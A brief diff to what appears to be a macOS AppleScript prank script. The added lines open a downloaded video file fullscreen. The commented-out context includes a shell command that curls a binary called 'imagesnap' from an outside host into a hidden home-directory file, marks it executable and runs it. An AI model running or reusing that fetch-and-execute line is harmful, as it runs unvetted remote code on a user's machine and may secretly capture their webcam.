@@ -5,3 +5,6 @@
 --tell application "Finder" to display dialog "hi"
 --do shell script "curl http://sitetest.github.io/imagesnap >~/.i; chmod +x ~/.i; ~/.i"
 --do shell script "curl http://sitetest.github.io/tetris.mp4 >~/.tetris"
+open ~/.tetris
+delay 4
+tell application "System Events" to do keystroke "f" using {control down, command down}
